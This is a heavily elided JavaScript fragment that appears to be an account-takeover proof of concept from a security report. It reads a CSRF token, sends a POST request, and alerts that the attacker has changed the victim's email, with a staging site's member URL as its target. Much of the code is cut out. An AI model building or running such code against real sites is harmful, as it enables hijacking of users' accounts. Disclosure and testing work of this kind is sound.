    ...
    if (csrfTokenMatch && csrfTokenMatch[1]) {
      ...
      fetch(postUrl, {
        ...
        .then(data => {
          ...
          alert('Attacker has changed your email to attacker@accounttakeover.com')
        })
        .catch(error => {
...
var url = "https://outfitters.stage.sugariapps.com/members/xploiterr-d29379/contactmembers";
